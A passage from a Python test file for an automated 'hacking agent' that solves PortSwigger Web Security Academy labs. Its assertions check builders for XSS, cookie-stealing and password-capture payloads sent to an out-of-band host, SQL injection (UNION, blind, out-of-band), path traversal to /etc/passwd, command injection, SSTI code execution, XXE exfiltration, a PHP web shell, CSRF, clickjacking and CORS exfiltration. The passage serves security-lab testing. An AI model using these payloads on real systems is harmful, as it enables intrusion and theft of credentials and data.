            url="https://portswigger.net/web-security/clickjacking/lab-x"
        )
        self.assertTrue(routed["is_client_side"])
        if DEFAULT_CORPUS_PATH.exists():
            entry = corpus_lookup(
                url="https://portswigger.net/web-security/request-smuggling/"
                    "finding/lab-confirming-a-cl-te-vulnerability-via-differential-responses"
            )
            # URL may or may not be in corpus; lookup must never raise.
            self.assertTrue(entry is None or entry.vuln_class == "request-smuggling")


# =============================================================================
# Phase 3 — expanded exploit primitives + exploit-server hosting
# =============================================================================

class ExploitPrimitivesExpandedTests(unittest.TestCase):
    def test_xss_context_builders_emit_expected_markers(self):
        from hacking_agent.core import exploit_primitives as p

        self.assertEqual(p.xss_js_string_breakout(), "';alert(document.domain)//")
        self.assertTrue(p.xss_js_string_backslash().startswith("\\';"))
        self.assertEqual(p.xss_template_literal("alert(1)"), "${alert(1)}")
        self.assertIn("onmouseover", p.xss_attribute_event())
        self.assertIn("autofocus", p.xss_attribute_autofocus())
        self.assertIn("<svg onload=", p.xss_attribute_tag_breakout())
        self.assertTrue(p.xss_js_url().startswith("javascript:"))

    def test_angularjs_sandbox_escape_is_version_specific(self):
        from hacking_agent.core import exploit_primitives as p

        v16 = p.xss_angularjs(version="1.6")
        self.assertIn("constructor.constructor", v16)
        self.assertTrue(v16.startswith("{{") and v16.endswith("}}"))
        v13 = p.xss_angularjs(version="1.3")
        self.assertIn("__proto__", v13)

    def test_postmessage_exploit_posts_on_onload_not_onerror(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.postmessage_exploit("https://lab/", "<img src=x onerror=alert(1)>")
        self.assertIn("onload=", page.body)
        self.assertNotIn("onerror=\"", page.body)
        self.assertIn("postMessage(", page.body)
        self.assertLess(page.body.index("<iframe"), page.body.index("postMessage("))

    def test_csrf_method_override_and_referrer_variants(self):
        from hacking_agent.core import exploit_primitives as p

        override = p.csrf_method_override(
            "https://lab/api/user", {"role": "admin"}, override_method="PATCH",
        )
        self.assertIn('name="_method"', override.body)
        self.assertIn("PATCH", override.body)
        self.assertIn(".submit()", override.body)

        ref = p.csrf_referrer_suppressed("https://lab/email", {"email": "x@e.net"})
        self.assertIn('name="referrer"', ref.body)
        self.assertIn("no-referrer", ref.body)

    def test_dangling_markup_and_cookie_and_password_payloads(self):
        from hacking_agent.core import exploit_primitives as p

        dangle = p.dangling_markup_exfil("https://collab.oast")
        self.assertTrue(dangle.startswith('"><img src="'))
        self.assertNotIn("</img>", dangle)
        self.assertIn("document.cookie", p.xss_cookie_stealer("https://collab.oast"))
        pw = p.xss_password_capture("https://collab.oast")
        self.assertIn('type="password"', pw)
        self.assertIn("onchange=", pw)

    def test_clickjacking_prefilled_carries_query_and_overlay(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.clickjacking_prefilled(
            "https://lab/my-account", query="email=attacker@evil.net",
            decoy_text="Free stuff",
        )
        self.assertIn("email=attacker@evil.net", page.body)
        self.assertIn("opacity", page.body)
        self.assertIn("Free stuff", page.body)

        multi = p.clickjacking_multistep(
            "https://lab/", [{"text": "one", "top": 10, "left": 5},
                             {"text": "two", "top": 40, "left": 5}],
        )
        self.assertEqual(multi.body.count('class="decoy"'), 2)
        self.assertIn("one", multi.body)
        self.assertIn("two", multi.body)

    def test_prototype_pollution_builders(self):
        from hacking_agent.core import exploit_primitives as p

        self.assertEqual(
            p.prototype_pollution_url("isAdmin", "true"),
            "__proto__[isAdmin]=true",
        )
        self.assertIn("__proto__.isAdmin=1", p.prototype_pollution_url(
            "isAdmin", "1", notation="dot"))
        self.assertIn('"__proto__"', p.prototype_pollution_json("isAdmin", True))
        self.assertIn("constructor", p.prototype_pollution_constructor_json("x", 1))
        probes = p.prototype_pollution_probes("https://lab/")
        self.assertEqual(len(probes), 3)
        self.assertTrue(any("__proto__" in q for q in probes))

    def test_cors_null_origin_uses_sandboxed_iframe(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.cors_null_origin_page("https://lab/api/key", "https://collab.oast")
        self.assertIn("sandbox=", page.body)
        self.assertIn("srcdoc=", page.body)
        self.assertIn("https://lab/api/key", page.body)


class ExploitServerExpandedTests(unittest.TestCase):
    def test_build_response_head_with_csp_and_headers(self):
        from hacking_agent.core.exploit_server import (
            build_response_head, html_head_with_csp,
        )

        head = build_response_head(
            status=302, reason="Found",
            content_type="text/html",
            headers={"Location": "/next", "X-Test": "1"},
        )
        self.assertTrue(head.startswith("HTTP/1.1 302 Found"))
        self.assertIn("Location: /next", head)
        csp_head = html_head_with_csp("default-src 'self'")
        self.assertIn("Content-Security-Policy: default-src 'self'", csp_head)

    def test_store_many_and_deliver_specific_path(self):
        from hacking_agent.core.exploit_server import ExploitServer
        from hacking_agent.core.exploit_primitives import ExploitPage

        posts = []

        def http_get(url, follow_redirects=True):
            return None  # force fallback field names

        def http_post(url, data, headers=None):
            posts.append(data)
            return "HTTP/1.1 200 OK\n\nstored"

        server = ExploitServer("https://exploit-abc.exploit-server.net",
                               http_get=http_get, http_post=http_post)
        results = server.store_many({
            "/a": ExploitPage(head="H", body="BODY_A"),
            "/b": ("H2", "BODY_B"),
        })
        self.assertEqual(results, {"/a": True, "/b": True})
        self.assertEqual(sorted(server.stored_paths()), ["/a", "/b"])

        self.assertTrue(server.deliver_to_victim(path="/a"))
        self.assertIn("responseBody=BODY_A", posts[-1])
        self.assertIn("formAction=DELIVER_TO_VICTIM", posts[-1])


# =============================================================================
# family-injection: reusable deterministic injection routines
# =============================================================================

class InjectionRoutineTests(unittest.TestCase):
    def test_union_column_count_order_by_and_nulls(self):
        from hacking_agent.core import injection as inj

        # ORDER BY: valid while n <= 3, errors afterwards.
        count = inj.solve_column_count_order_by(
            lambda p: any(f"ORDER BY {n}-" in p for n in (1, 2, 3)),
            max_columns=10,
        )
        self.assertEqual(count, 3)
        # UNION NULLs: only the exact column count renders.
        self.assertEqual(
            inj.solve_column_count_union(lambda p: p.count("NULL") == 4), 4
        )
        self.assertIsNone(
            inj.solve_column_count_order_by(lambda p: False, max_columns=5)
        )

    def test_union_text_column_probes_and_select_builder(self):
        from hacking_agent.core import injection as inj

        probes = inj.union_text_column_probes(3, marker="MARK")
        self.assertEqual([i for i, _ in probes], [1, 2, 3])
        self.assertIn("'MARK',NULL,NULL", probes[0][1])
        self.assertIn("NULL,NULL,'MARK'", probes[2][1])
        payload = inj.union_select_payload(
            3, {2: "username"}, from_table="users")
        self.assertIn("UNION SELECT NULL,username,NULL FROM users", payload)

    def test_blind_binary_extraction_and_length(self):
        from hacking_agent.core import injection as inj

        target = "S3cr3t!"
        recovered = inj.extract_string_binary(
            lambda i, c: ord(target[i - 1]) >= c, len(target))
        self.assertEqual(recovered, target)
        self.assertEqual(
            inj.discover_length(lambda n: len(target) >= n), len(target)
        )
        # binary_search works for a single value in an arbitrary range too.
        self.assertEqual(
            inj.binary_search_value(lambda c: 200 >= c, low=0, high=255), 200
        )

    def test_dbms_dialect_payloads(self):
        from hacking_agent.core import injection as inj

        self.assertEqual(
            inj.multi_value_expression("oracle", ["username", "password"]),
            "username||'~'||password",
        )
        self.assertEqual(
            inj.multi_value_expression("mysql", ["username", "password"]),
            "CONCAT(username,'~',password)",
        )
        self.assertEqual(
            inj.multi_value_expression("microsoft", ["a", "b"]), "a+'~'+b"
        )
        oracle = inj.get_dialect("oracle")
        self.assertEqual(oracle.from_dual, " FROM dual")
        self.assertIn("dbms_pipe.receive_message", oracle.time_delay(5))
        self.assertIn("WAITFOR DELAY '0:0:10'",
                      inj.get_dialect("mssql").time_delay(10))
        self.assertIn("pg_sleep",
                      inj.get_dialect("postgres").conditional_time("1=1", 5))
        self.assertEqual(
            inj.get_dialect("oracle").tables_query,
            "SELECT table_name FROM all_tables",
        )

    def test_oob_and_xml_encoding_bypass(self):
        from hacking_agent.core import injection as inj

        self.assertIn("xp_dirtree",
                      inj.oob_sqli_payload("microsoft", "abc.oastify.com"))
        oracle_oob = inj.oob_sqli_payload(
            "oracle", "abc.oastify.com", "SELECT password FROM users")
        self.assertIn("EXTRACTVALUE", oracle_oob)
        self.assertIn("SELECT password FROM users", oracle_oob)
        # XML-encoding filter bypass: hex numeric entities per character.
        self.assertEqual(inj.xml_entity_encode("AB"), "&#x41;&#x42;")
        self.assertEqual(inj.xml_entity_encode("AB", hexadecimal=False),
                         "&#65;&#66;")
        body = inj.xml_encoded_injection("' UNION SELECT NULL-- ")
        self.assertIn("<stockCheck>", body)
        self.assertNotIn("UNION", body)  # keyword is entity-encoded

    def test_path_traversal_variants_cover_all_subvariants(self):
        from hacking_agent.core import injection as inj

        variants = dict(inj.path_traversal_payloads("/etc/passwd", depth=3))
        self.assertEqual(variants["simple"], "../../../etc/passwd")
        self.assertEqual(variants["absolute"], "/etc/passwd")
        self.assertTrue(variants["nested_strip_bypass"].startswith("....//"))
        self.assertTrue(variants["single_url_encode"].startswith("%2e%2e%2f"))
        self.assertTrue(variants["double_url_encode"].startswith("%252e"))
        self.assertTrue(variants["start_of_path"].startswith("/var/www/images/"))
        self.assertTrue(variants["null_byte"].endswith("%00.png"))
        self.assertTrue(inj.looks_like_etc_passwd("root:x:0:0:root:/root:/bin/sh"))
        self.assertFalse(inj.looks_like_etc_passwd("nothing here"))

    def test_command_injection_and_ssti_and_xxe_builders(self):
        from hacking_agent.core import injection as inj

        values = inj.command_injection_values(base="1", token="TOK")
        self.assertIn(("|", "1|echo TOK"), values)
        self.assertTrue(any("sleep 10" in v for _, v in
                            inj.command_time_delay_values(seconds=10)))
        redirect, name = inj.command_output_redirect_values(command="whoami")
        self.assertIn("> /var/www/images/output.txt", redirect)
        self.assertEqual(name, "output.txt")
        self.assertTrue(any("nslookup" in v for _, v in
                            inj.command_oob_values("c.oastify.com")))

        # SSTI engine fingerprinting (Jinja2 vs Twig disambiguation).
        self.assertEqual(
            inj.ssti_detect_engine({"{{7*7}}": "49", "{{7*'7'}}": "7777777"}),
            "jinja2",
        )
        self.assertEqual(
            inj.ssti_detect_engine({"{{7*7}}": "49", "{{7*'7'}}": "49"}), "twig"
        )
        self.assertEqual(
            inj.ssti_detect_engine({"${7*7}": "49"}), "freemarker"
        )
        self.assertIn("popen", inj.ssti_rce_payload("jinja2", "id"))
        self.assertEqual(inj.ssti_rce_payload("unknown-engine"), "")

        # XXE builder family.
        self.assertIn("file:///etc/passwd", inj.xxe_file_read_body("productId"))
        self.assertIn("http://169.254.169.254/",
                      inj.xxe_ssrf_body("http://169.254.169.254/"))
        dtd = inj.xxe_external_dtd("exploit.net", file="/etc/passwd")
        self.assertIn("file:///etc/passwd", dtd)
        self.assertIn("%exfil;", dtd)
        self.assertIn("file:///nonexistent/", inj.xxe_error_based_dtd())
        self.assertIn("xi:include", inj.xinclude_payload())
        self.assertIn("<svg", inj.svg_xxe())

    def test_nosql_and_file_upload_helpers(self):
        from hacking_agent.core import injection as inj

        body = inj.nosql_auth_bypass_json("administrator")
        self.assertEqual(body["password"], {"$ne": ""})
        self.assertTrue(inj.nosql_auth_bypass_variants())
        self.assertTrue(any("$where" not in s for s in inj.nosql_injection_strings()))
        self.assertIn("system", inj.php_web_shell())
        self.assertIn("file_get_contents", inj.php_read_secret_shell())
        names = dict(inj.upload_filename_variants("exploit", ext="php"))
        self.assertEqual(names["double_extension"], "exploit.php.jpg")
        self.assertIn("image/jpeg", inj.upload_content_types())
        self.assertTrue(inj.polyglot_php_jpg().startswith(b"\xff\xd8\xff"))


class _InjectionFakeExecutor:
    """Scriptable tool executor for injection fast-path tests."""

    def __init__(self, responder):
        self.calls = []
        self._responder = responder

    def call(self, decision, agent_name, phase="general", iteration=0):
        self.calls.append(decision)
        return {
            "blocked": False,
            "blocked_reason": "",
            "signals": None,
            "result": self._responder(decision),
        }


class InjectionFastPathTests(unittest.TestCase):
    def _agent_and_vuln(self, vuln_type, fake):
        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": vuln_type,
            "severity": "high",
            "target_entity_id": target.id,
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        agent = ExploitationAgent(
            provider=None, memory=memory, state_machine=StateMachine(),
            evidence=EvidenceStore(), tool_executor=fake,
        )
        return agent, vuln, memory

    def test_path_traversal_fast_path_reads_etc_passwd(self):
        from urllib.parse import unquote

        def responder(decision):
            url = decision.args.get("url", "")
            if "../etc/passwd" in unquote(url):
                return "HTTP/1.1 200 OK\r\n\r\nroot:x:0:0:root:/root:/bin/bash"
            return "HTTP/1.1 404 Not Found\r\n\r\nNot found"

        fake = _InjectionFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("Path traversal", fake)
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Path traversal lab. Target: " + target, target)
        self.assertEqual(profile["playbook_id"], "path_traversal")

        result = agent.execute(AgentTask(
            task_description="Read /etc/passwd via path traversal.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertTrue(agent.evidence.is_verified(vuln.id))
        self.assertEqual(vuln.attrs["status"], "verified")
        self.assertEqual(vuln.attrs["path_traversal_variant"], "simple")

    def test_os_command_injection_fast_path_echoes_token(self):
        from urllib.parse import unquote

        token = ExploitationAgent.INJECTION_TOKEN

        def responder(decision):
            args = decision.args
            method = args.get("method", "GET")
            url = args.get("url", "")
            if method == "GET" and url.rstrip("/").endswith("web-security-academy.net"):
                return "HTTP/1.1 200 OK\r\n\r\n<div class='is-solved'>solved</div>"
            data = unquote(args.get("data", "") or "")
            if f"echo {token}" in data:
                return f"HTTP/1.1 200 OK\r\n\r\n{token}"
            return "HTTP/1.1 200 OK\r\n\r\n617 units"

        fake = _InjectionFakeExecutor(responder)
        agent, vuln, memory = self._agent_and_vuln("OS command injection", fake)
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile(
            "OS command injection, simple case. Target: " + target, target)
        self.assertEqual(profile["playbook_id"], "os_command_injection")

        result = agent.execute(AgentTask(
            task_description="Execute whoami via command injection.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertTrue(agent.evidence.is_verified(vuln.id))
        self.assertTrue(
            memory.get_fact("command_injection_verified", entity_id=vuln.id))
        self.assertTrue(memory.get_fact("lab_solved"))

    def test_sqli_union_fast_path_recovers_credentials(self):
        from urllib.parse import unquote

        def responder(decision):
            url = decision.args.get("url", "")
            q = unquote(url)
            # ORDER BY: valid for <=2 columns, error afterwards.
            m = re.search(r"ORDER BY (\d+)", q)
            if m:
                if int(m.group(1)) <= 2:
                    return "HTTP/1.1 200 OK\r\n\r\nproducts"
                return "HTTP/1.1 500 Internal Server Error\r\n\r\nerror"
            if "rEyNaRdCol" in q:
                # text renders only in the 2nd column.
                if "NULL,'rEyNaRdCol'" in q:
                    return "HTTP/1.1 200 OK\r\n\r\n<h1>rEyNaRdCol</h1>"
                return "HTTP/1.1 200 OK\r\n\r\nproducts"
            if "FROM users" in q:
                return ("HTTP/1.1 200 OK\r\n\r\n"
                        "administrator~s3cr3tpw\nwiener~peter\n")
            return "HTTP/1.1 200 OK\r\n\r\nproducts"

        fake = _InjectionFakeExecutor(responder)
        agent, vuln, memory = self._agent_and_vuln("SQL injection", fake)
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile(
            "SQL injection UNION attack retrieving data. Target: " + target, target)
        self.assertEqual(profile["playbook_id"], "sqli")

        result = agent.execute(AgentTask(
            task_description="UNION SQLi to retrieve credentials.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["sqli_column_count"], 2)
        self.assertEqual(vuln.attrs["sqli_text_column"], 2)
        self.assertIn("administrator", vuln.attrs["sqli_recovered_users"])

    def test_injection_fast_path_is_guarded_when_no_signal(self):
        def responder(decision):
            return "HTTP/1.1 404 Not Found\r\n\r\nnothing"

        fake = _InjectionFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("Path traversal", fake)
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Path traversal lab. Target: " + target, target)
        # No provider -> the guarded fast path must return None, and with no LLM
        # provider the agent falls back without raising.
        result = agent.execute(AgentTask(
            task_description="Read /etc/passwd via path traversal.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertFalse(result.success)


# =============================================================================
# family-clientside: reusable client-side routines (context detect + selection)
# =============================================================================

class ClientsideRoutineTests(unittest.TestCase):
    def test_detect_reflection_context_across_contexts(self):
        from hacking_agent.core import clientside as cs

        m = cs.MARKER
        cases = {
            f"<div>{m}</div>": (cs.CTX_HTML, ""),
            f'<input type=text value="{m}">': (cs.CTX_ATTR, '"'),
            f"<input value='{m}'>": (cs.CTX_ATTR, "'"),
            f"<input value={m}>": (cs.CTX_ATTR_UNQUOTED, ""),
            f"<script>var a='{m}';</script>": (cs.CTX_JS_STRING, "'"),
            f'<script>var a="{m}";</script>': (cs.CTX_JS_STRING, '"'),
            f"<script>var a=`{m}`;</script>": (cs.CTX_TEMPLATE_LITERAL, "`"),
            f"<script>var a={m};</script>": (cs.CTX_JS, ""),
            "<div>nothing here</div>": (cs.CTX_NONE, ""),
        }
        for html, (ctx_name, quote) in cases.items():
            with self.subTest(html=html):
                ctx = cs.detect_reflection_context(html)
                self.assertEqual(ctx.context, ctx_name)
                self.assertEqual(ctx.quote, quote)
        # attribute context also recovers the enclosing tag name.
        attr = cs.detect_reflection_context(f'<a href="{m}">x</a>')
        self.assertEqual(attr.tag, "a")

    def test_analyze_char_filtering_consumes_reflected_run(self):
        from hacking_agent.core import clientside as cs

        m = cs.MARKER
        raw = cs.analyze_char_filtering(f"<div>{m}<>\"'`</div>")
        self.assertEqual(raw["<"], "raw")
        self.assertEqual(raw['"'], "raw")
        # Encoded specials must NOT be confused with the trailing </div> markup.
        enc = cs.analyze_char_filtering(f"<div>{m}&lt;&gt;&quot;&#39;`</div>")
        self.assertEqual(enc["<"], "encoded")
        self.assertEqual(enc[">"], "encoded")
        self.assertEqual(enc['"'], "encoded")
        self.assertEqual(enc["'"], "encoded")
        stripped = cs.analyze_char_filtering(f"<div>{m}\"'`</div>")
        self.assertEqual(stripped["<"], "stripped")
        self.assertEqual(stripped['"'], "raw")

    def test_select_xss_payload_picks_context_correct_primitive(self):
        from hacking_agent.core import clientside as cs

        html_ctx = cs.detect_reflection_context(f"<p>{cs.MARKER}</p>")
        tech, payload = cs.select_xss_payload(html_ctx)
        self.assertEqual(tech, "html_script")
        self.assertIn("<script>", payload)

        # Attribute with angle brackets encoded -> stay in the tag (autofocus).
        attr = cs.detect_reflection_context(f'<input value="{cs.MARKER}">')
        tech, payload = cs.select_xss_payload(
            attr, filters={"<": "encoded", ">": "encoded"})
        self.assertEqual(tech, "attr_autofocus")
        self.assertIn("autofocus", payload)
        # Attribute where angle brackets survive -> break out of the tag.
        tech, payload = cs.select_xss_payload(attr, filters={"<": "raw", ">": "raw"})
        self.assertEqual(tech, "attr_tag_breakout")
        self.assertIn("<svg onload=", payload)

        # JS string, backslash-escaped quote variant.
        js = cs.detect_reflection_context(f"<script>x='{cs.MARKER}'</script>")
        tech, payload = cs.select_xss_payload(js, js_escapes_quote=True)
        self.assertEqual(tech, "js_string_backslash")
        self.assertTrue(payload.startswith("\\'"))
        tech, payload = cs.select_xss_payload(js)
        self.assertEqual(tech, "js_string_breakout")

        # Template literal.
        tl = cs.detect_reflection_context(f"<script>x=`{cs.MARKER}`</script>")
        tech, payload = cs.select_xss_payload(tl)
        self.assertEqual(tech, "template_literal")
        self.assertTrue(payload.startswith("${"))

        # Sub-variant flags: svg-only and canonical.
        tech, _ = cs.select_xss_payload(html_ctx, svg_only=True)
        self.assertEqual(tech, "svg_onload")
        tech, payload = cs.select_xss_payload(html_ctx, canonical=True)
        self.assertEqual(tech, "canonical_link")
        self.assertIn("accesskey", payload)

    def test_dom_sink_detection_and_payload_selection(self):
        from hacking_agent.core import clientside as cs

        self.assertEqual(
            cs.detect_dom_sink("document.write(location.search)"), "document_write")
        self.assertEqual(
            cs.detect_dom_sink("el.innerHTML = data"), "innerhtml")
        self.assertEqual(
            cs.detect_dom_sink("$(location.hash)"), "jquery_selector")
        tech, payload = cs.select_dom_payload("document_write")
        self.assertEqual(tech, "dom_document_write")
        self.assertIn("onerror", payload)
        tech, payload = cs.select_dom_payload("jquery_href")
        self.assertTrue(payload.startswith("javascript:"))

    def test_select_csrf_page_routes_variants(self):
        from hacking_agent.core import clientside as cs

        action = "https://lab/my-account/change-email"
        fields = {"email": "a@evil.net", "csrf": "T"}
        # No defenses -> plain auto-submit form.
        plain = cs.select_csrf_page("no defenses", action, fields)
        self.assertIn(".submit()", plain.body)
        self.assertNotIn("no-referrer", plain.body)
        # Referer validation -> suppressed Referer.
        ref = cs.select_csrf_page("referer validation", action, fields)
        self.assertIn("no-referrer", ref.body)
        # Method-dependent -> GET image/navigation.
        meth = cs.select_csrf_page(
            "token validation depends on request method", action, fields,
            get_query="email=a@evil.net")
        self.assertTrue("<img" in meth.body or "location" in meth.body)
        # Double-submit cookie -> cookie-setter img + single submit.
        ds = cs.select_csrf_page(
            "token tied to non-session cookie", action, fields,
            cookie_setter_url="https://lab/?search=x", token_value="FORGED",
            email_value="a@evil.net")
        self.assertIn("onload=", ds.body)
        self.assertEqual(ds.body.count(".submit()"), 1)

    def test_detect_cors_reflection_classifies_kinds(self):
        from hacking_agent.core import clientside as cs

        reflected = cs.detect_cors_reflection(
            "Access-Control-Allow-Origin: https://evil.net\n"
            "Access-Control-Allow-Credentials: true",
            "https://evil.net")
        self.assertEqual(reflected["kind"], cs.CORS_REFLECTED)
        self.assertTrue(reflected["exploitable"])
        null = cs.detect_cors_reflection(
            {"Access-Control-Allow-Origin": "null",
             "Access-Control-Allow-Credentials": "true"}, "null")
        self.assertEqual(null["kind"], cs.CORS_NULL)
        self.assertTrue(null["exploitable"])
        wildcard = cs.detect_cors_reflection(
            "Access-Control-Allow-Origin: *", "https://evil.net")
        self.assertEqual(wildcard["kind"], cs.CORS_WILDCARD)
        self.assertFalse(wildcard["exploitable"])  # no credentials with '*'
        none = cs.detect_cors_reflection(
            "Access-Control-Allow-Origin: https://trusted.net", "https://evil.net")
        self.assertEqual(none["kind"], cs.CORS_NONE)

    def test_select_clickjacking_page_routes_variants(self):
        from hacking_agent.core import clientside as cs

        basic = cs.select_clickjacking_page("basic", "https://lab/my-account")
        self.assertIn("<iframe", basic.body)
        self.assertIn("opacity", basic.body)
        prefilled = cs.select_clickjacking_page(
            "prefilled", "https://lab/my-account",
            prefill_query="email=a@evil.net")
        self.assertIn("email=a@evil.net", prefilled.body)
        multi = cs.select_clickjacking_page(
            "multistep", "https://lab/",
            decoys=[{"text": "one", "top": 10, "left": 5},
                    {"text": "two", "top": 40, "left": 5}])
        self.assertEqual(multi.body.count('class="decoy"'), 2)

    def test_prototype_pollution_probes_and_detection(self):
        from hacking_agent.core import clientside as cs

        client = cs.pp_client_source_probes("https://lab/")
        self.assertEqual(len(client), 3)
        self.assertTrue(any("__proto__" in p for p in client))
        server = cs.pp_server_probes()
        self.assertTrue(any('"__proto__"' in b for b in server))
        self.assertTrue(any("constructor" in b for b in server))
        self.assertIn("Object.prototype", cs.pp_detection_script())
        self.assertTrue(cs.detect_prototype_pollution("polluted"))
        self.assertTrue(cs.detect_prototype_pollution(True))
        self.assertFalse(cs.detect_prototype_pollution(None))
        gadgets = cs.pp_client_gadget_payloads("https://lab/")
        self.assertTrue(gadgets)
        self.assertTrue(all("__proto__" in frag for _, frag in gadgets))

    def test_web_cache_deception_paths_and_cache_detection(self):
        from hacking_agent.core import clientside as cs

        variants = dict(cs.web_cache_deception_paths("/my-account"))
        self.assertIn("static_ext_append", variants)
        self.assertTrue(variants["static_ext_append"].startswith("/my-account/"))
        self.assertTrue(variants["static_ext_append"].endswith(".js"))
        self.assertTrue(any(";" in p for p in variants.values()))
        self.assertTrue(cs.looks_cached("X-Cache: hit"))
        self.assertTrue(cs.looks_cached({"Age": "42"}))
        self.assertTrue(cs.looks_cached("Cache-Control: public, max-age=30"))
        self.assertFalse(cs.looks_cached("Cache-Control: no-store"))


class _ClientFakeExecutor:
    """Scriptable tool executor for client-side fast-path tests.

    The responder returns ``(result_str, signals_or_None)`` for each decision.
    """

    def __init__(self, responder):
        self.calls = []
        self._responder = responder

    def call(self, decision, agent_name, phase="general", iteration=0):
        self.calls.append(decision)
        result, signals = self._responder(decision)
        return {
            "blocked": False,
            "blocked_reason": "",
            "signals": signals,
            "result": result,
        }


class ClientsideFastPathTests(unittest.TestCase):
    def _agent_and_vuln(self, vuln_type, fake):
        memory = AgentMemory(target_url="https://0abc.web-security-academy.net")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": vuln_type,
            "severity": "high",
            "target_entity_id": target.id,
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        agent = ExploitationAgent(
            provider=None, memory=memory, state_machine=StateMachine(),
            evidence=EvidenceStore(), tool_executor=fake,
        )
        return agent, vuln, memory

    def test_reflected_xss_fast_path_fires_dialog(self):
        from urllib.parse import unquote

        def responder(decision):
            tool = decision.tool
            args = decision.args
            url = args.get("url", "")
            if tool == "browser_navigate":
                if "%3cscript" in url.lower() or "onload" in url.lower():
                    return json.dumps({
                        "xss_proof": "alert(document.domain)",
                        "rendered_content": "<html>fired</html>",
                    }), {"xss_proof": "alert(document.domain)"}
                return json.dumps({"xss_proof": "", "rendered_content": "<html></html>"}), None
            # http_request: echo the reflected value into an HTML body context.
            if "search=" in url:
                value = unquote(url.split("search=", 1)[1])
                return f"HTTP/1.1 200 OK\r\n\r\n<div>{value}</div>", None
            return "HTTP/1.1 200 OK\r\n\r\n<html>home</html>", None

        fake = _ClientFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("Reflected XSS", fake)
        target = "https://0abc.web-security-academy.net"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        self.assertEqual(profile["playbook_id"], "xss")

        result = agent.execute(AgentTask(
            task_description="Reflected XSS into HTML context.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertTrue(agent.evidence.is_verified(vuln.id))
        self.assertEqual(vuln.attrs["xss_context"], "html")
        self.assertEqual(vuln.attrs["xss_technique"], "html_script")

    def test_dom_xss_fast_path_fires_dialog(self):
        def responder(decision):
            tool = decision.tool
            url = decision.args.get("url", "")
            if tool == "browser_navigate":
                if "onerror" in url.lower():
                    return json.dumps({
                        "xss_proof": "alert(document.domain)",
                        "rendered_content": "<html>fired</html>",
                    }), {"xss_proof": "alert(document.domain)"}
                return json.dumps({"xss_proof": ""}), None
            # home page JS exposes a document.write sink.
            return ("HTTP/1.1 200 OK\r\n\r\n"
                    "<script>document.write(location.search)</script>"), None

        fake = _ClientFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("DOM XSS", fake)
        target = "https://0abc.web-security-academy.net"
        profile = detect_lab_profile("DOM XSS lab. Target: " + target, target)
        self.assertEqual(profile["playbook_id"], "dom_xss")

        result = agent.execute(AgentTask(
            task_description="DOM XSS via document.write.",
            context={"target_url": target, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertEqual(vuln.attrs["dom_sink"], "document_write")

    def test_cors_fast_path_verifies_via_oob_callback(self):
        def responder(decision):
            tool = decision.tool
            args = decision.args
            url = args.get("url", "")
            method = args.get("method", "GET")
            if tool == "oob_get_domain":
                return json.dumps({
                    "domain": "abc.oast.pro",
                    "http_url": "http://abc.oast.pro",
                    "token": "tok123",
                }), None
            if tool == "oob_poll":
                return json.dumps({"matched": 1, "summary": "HTTP callback"}), None
            # http_request
            if "/accountDetails" in url:
                origin = (args.get("headers") or {}).get("Origin", "")
                return (
                    "HTTP/1.1 200 OK\r\n"
                    f"Access-Control-Allow-Origin: {origin}\r\n"
                    "Access-Control-Allow-Credentials: true\r\n\r\n"
                    '{"apikey":"SECRET-KEY"}'
                ), None
            if url.endswith("/my-account"):
                return "HTTP/1.1 200 OK\r\n\r\n<a>Log out</a>", None
            if url.endswith("/login"):
                return "HTTP/1.1 200 OK\r\n\r\n<form></form>", None
            if "exploit-server" in url and method == "POST":
                return "HTTP/1.1 200 OK\r\n\r\nstored", None
            return "HTTP/1.1 200 OK\r\n\r\n<html>home</html>", None

        fake = _ClientFakeExecutor(responder)
        agent, vuln, memory = self._agent_and_vuln("CORS misconfiguration", fake)
        target = "https://0abc.web-security-academy.net"
        profile = detect_lab_profile("CORS vulnerability lab. Target: " + target, target)
        self.assertEqual(profile["playbook_id"], "cors")

        result = agent.execute(AgentTask(
            task_description="CORS origin reflection exfil.",
            context={
                "target_url": target,
                "lab_profile": profile,
                "exploit_server_url": "https://exploit-abc.exploit-server.net",
            },
            target_vulnerability_id=vuln.id,
        ))
        self.assertTrue(result.success)
        self.assertTrue(agent.evidence.is_verified(vuln.id))
        self.assertEqual(vuln.attrs["cors_kind"], "origin_reflected")
        self.assertTrue(memory.get_fact("cors_verified", entity_id=vuln.id))

    def test_xss_fast_path_guarded_when_no_reflection(self):
        def responder(decision):
            if decision.tool == "browser_navigate":
                return json.dumps({"xss_proof": ""}), None
            return "HTTP/1.1 200 OK\r\n\r\n<html>no reflection</html>", None

        fake = _ClientFakeExecutor(responder)
        agent, vuln, _ = self._agent_and_vuln("Reflected XSS", fake)
        target = "https://0abc.web-security-academy.net"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
